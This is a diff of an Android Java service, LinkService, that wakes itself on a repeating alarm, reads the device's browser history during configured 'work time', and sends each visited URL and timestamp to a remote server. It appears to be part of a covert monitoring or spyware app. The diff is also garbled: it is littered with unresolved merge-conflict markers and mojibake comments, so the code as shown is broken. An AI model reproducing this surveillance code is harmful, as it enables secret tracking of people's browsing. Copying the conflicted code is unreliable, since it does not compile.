@@ -4,6 +4,10 @@ import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import android.annotation.SuppressLint;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -16,40 +20,67 @@ import android.database.Cursor;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.provider.Browser;
-import android.util.Log;
 
-import com.inet.android.bs.FileLog;
-import com.inet.android.bs.Request;
-import com.inet.android.bs.WorkTimeDefiner;
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+import com.inet.android.utils.WorkTimeDefiner;
 
+/**
+ * РљР»Р°СЃСЃ СЃР±РѕСЂР° РёСЃС‚РѕСЂРёРё СЃС‚Р°РЅРґР°СЂС‚РЅРѕРіРѕ Р±СЂР°СѓР·РµСЂР°
+ * 
+ * @author johny homicide
+ * 
+ */
 public class LinkService extends Service {
 
+<<<<<<< HEAD
+	private static final int SERVICE_REQUEST_CODE = 25; // СѓРЅРёРєР°Р»СЊРЅС‹Р№ int
+														// СЃРµСЂРІРёСЃР°
+=======
 	private static final int SERVICE_REQUEST_CODE = 25; // уникальный int сервиса
+>>>>>>> refs/remotes/origin/war
 	final String LOG_TAG = "historyService";
 	SharedPreferences sPref;
 	final String SAVED_TIME = "saved_time";
 	private Context context;
 	private SharedPreferences sp;
-	Request req;
+
 	public void onCreate() {
 		super.onCreate();
 		startService(new Intent(this, LinkService.class));
-		
-		Log.d(LOG_TAG, "onCreate histroyService");
-		FileLog.writeLog("onCreate histroyService");
-		
+
+		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
+
 		context = getApplicationContext();
-		sp = PreferenceManager.getDefaultSharedPreferences(context);// getPreferences(MODE_PRIVATE);
+		sp = PreferenceManager.getDefaultSharedPreferences(context);
 
 	}
 
 	public int onStartCommand(Intent intent, int flags, int startId) {
+<<<<<<< HEAD
+=======
 		Log.d(LOG_TAG, "onStartCommand - " + sp.getString("ID", "ID"));
 		FileLog.writeLog(LOG_TAG + " -> onStartCommand - " + sp.getString("ID", "ID"));
 		
 		sp = PreferenceManager.getDefaultSharedPreferences(this);
 		String linkEnd = sp.getString("ACTION", "OK");
+>>>>>>> refs/remotes/origin/war
 
+<<<<<<< HEAD
+		Logging.doLog(LOG_TAG,
+				"onStartCommand - " + sp.getString("account", "ID"),
+				"onStartCommand - " + sp.getString("account", "ID"));
+
+		sp = PreferenceManager.getDefaultSharedPreferences(this);
+		String linkEnd = sp.getString("code", "2");
+
+		if (linkEnd.equals("3")) {
+			Logging.doLog(LOG_TAG, "code : 3", "code : 3");
+
+			return 0;
+		}
+
+=======
 		if (linkEnd.equals("REMOVE")) {
 			Log.d(LOG_TAG, "REMOVE");
 			FileLog.writeLog("historyService -> REMOVE");
@@ -57,8 +88,11 @@ public class LinkService extends Service {
 			return 0;
 		}
 		
+>>>>>>> refs/remotes/origin/war
 		Calendar cal = Calendar.getInstance();
-		cal.add(Calendar.MINUTE, 1);// через 1 минут
+		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));// С‡РµСЂРµР·
+																				// 1
+																				// РјРёРЅСѓС‚
 
 		PendingIntent servicePendingIntent = PendingIntent.getService(this,
 				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),
@@ -67,6 +101,24 @@ public class LinkService extends Service {
 		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
+<<<<<<< HEAD
+
+		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
+		if (!isWork) {
+			Logging.doLog(LOG_TAG,
+					"isDoWork return " + Boolean.toString(isWork),
+					"isDoWork return " + Boolean.toString(isWork));
+
+			return Service.START_STICKY;
+		} else {
+			Logging.doLog(LOG_TAG,
+					"isDoWork return " + Boolean.toString(isWork),
+					"isDoWork return " + Boolean.toString(isWork));
+		}
+
+		linkTask(); // РїСЂРѕСЃРѕРјРѕС‚СЂ РёСЃС‚РѕСЂРёРё Р±СЂР°СѓР·РµСЂР°
+
+=======
 				
 		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
 		if (!isWork) {
@@ -81,21 +133,30 @@ public class LinkService extends Service {
 		
 		linkTask(); // просомотр истории браузера
 		
+>>>>>>> refs/remotes/origin/war
 		super.onStartCommand(intent, flags, startId);
 		return Service.START_STICKY;
 	}
 
 	public void onDestroy() {
 		super.onDestroy();
+<<<<<<< HEAD
+
+		Logging.doLog(LOG_TAG, "onDestroy", "onDestroy");
+=======
 		
 		Log.d(LOG_TAG, "onDestroy");
 		FileLog.writeLog("historyService -> onDestroy");
+>>>>>>> refs/remotes/origin/war
 	}
 
 	public IBinder onBind(Intent intent) {
+<<<<<<< HEAD
+=======
 		Log.d(LOG_TAG, "onBind");
 		FileLog.writeLog("historyService -> onBind");
 		
+>>>>>>> refs/remotes/origin/war
 		return null;
 	}
 
@@ -109,9 +170,17 @@ public class LinkService extends Service {
 		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
 				sel, null, null);
 		mCur.moveToFirst();
+<<<<<<< HEAD
+=======
 		
 		sPref = PreferenceManager.getDefaultSharedPreferences(context);
+>>>>>>> refs/remotes/origin/war
 
+<<<<<<< HEAD
+		sPref = PreferenceManager.getDefaultSharedPreferences(context);
+
+=======
+>>>>>>> refs/remotes/origin/war
 		String urlDate = "";
 		String url = "";
 
@@ -121,25 +190,36 @@ public class LinkService extends Service {
 				urlDate = mCur.getString(mCur
 						.getColumnIndex(Browser.BookmarkColumns.DATE));
 				Context context = getApplicationContext();
+<<<<<<< HEAD
+
+=======
 				
 				// Create a DateFormatter object for displaying date in
 				// specified format.
+>>>>>>> refs/remotes/origin/war
 				DateFormat formatter = new SimpleDateFormat(
 						"yyyy-MM-dd HH:mm:ss");
 
 				String savedTime = sPref.getString(SAVED_TIME, "");
 
-				// Create a calendar object that will convert the date and time
-				// value in milliseconds to date.
 				Calendar calendar = Calendar.getInstance();
 				calendar.setTimeInMillis(Long.parseLong(savedTime));
 
 				if (Long.parseLong(urlDate) > Long.parseLong(savedTime)) {
 
+<<<<<<< HEAD
+					Logging.doLog(LOG_TAG,
+							"--- "
+									+ formatter.format(calendar.getTime())
+											.toString(), "--- "
+									+ formatter.format(calendar.getTime())
+											.toString());
+=======
 					Log.d(LOG_TAG, "--- "
 							+ formatter.format(calendar.getTime()).toString());
 					FileLog.writeLog("historyService -> "
 							+ formatter.format(calendar.getTime()).toString());
+>>>>>>> refs/remotes/origin/war
 
 					calendar = Calendar.getInstance();
 					calendar.setTimeInMillis(Long.parseLong(urlDate));
@@ -147,9 +227,39 @@ public class LinkService extends Service {
 					url = mCur.getString(mCur
 							.getColumnIndex(Browser.BookmarkColumns.URL));
 
+<<<<<<< HEAD
+					String urlDateInFormat = formatter.format(
+							calendar.getTime()).toString();
+=======
 					String urlDateInFormat = formatter.format(calendar.getTime())
 							.toString();
+>>>>>>> refs/remotes/origin/war
 
+<<<<<<< HEAD
+					String sendJSONStr = null;
+					JSONObject jsonObject = new JSONObject();
+					JSONArray data = new JSONArray();
+					JSONObject info = new JSONObject();
+					JSONObject object = new JSONObject();
+					try {
+
+						info.put("url", url);
+						info.put("duration", "30");
+
+						object.put("time", urlDateInFormat);
+						object.put("type", "7");
+						object.put("info", info);
+						data.put(object);
+						jsonObject.put("data", data);
+						// sendJSONStr = jsonObject.toString();
+						sendJSONStr = data.toString();
+					} catch (JSONException e) {
+						Logging.doLog(LOG_TAG, "json СЃР»РѕРјР°Р»СЃСЏ", "json СЃР»РѕРјР°Р»СЃСЏ");
+					}
+
+					DataRequest dr = new DataRequest(context);
+					dr.sendRequest(object.toString());
+=======
 					String sendStr = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>" + urlDateInFormat
 							+ "</time><type>4</type><app>"
 							+ "Интернет-браузер</app><url>" + url
@@ -157,15 +267,24 @@ public class LinkService extends Service {
 							+ "</ntime></packet>";
 					req = new Request(context);
 					req.sendRequest(sendStr);
+>>>>>>> refs/remotes/origin/war
 
 					Editor ed = sPref.edit();
 					ed.putString(SAVED_TIME, urlDate);
 					ed.commit();
+<<<<<<< HEAD
+
+					Logging.doLog(LOG_TAG, formatter.format(calendar.getTime())
+							.toString() + " - " + url,
+							formatter.format(calendar.getTime()).toString()
+									+ " - " + url);
+=======
 					
 					Log.d(LOG_TAG, formatter.format(calendar.getTime())
 							.toString() + " - " + url);
 					FileLog.writeLog("historyService ->  "
 							+ formatter.format(calendar.getTime()).toString() + " - " + url);
+>>>>>>> refs/remotes/origin/war
 				}
 				mCur.moveToNext();
 			}
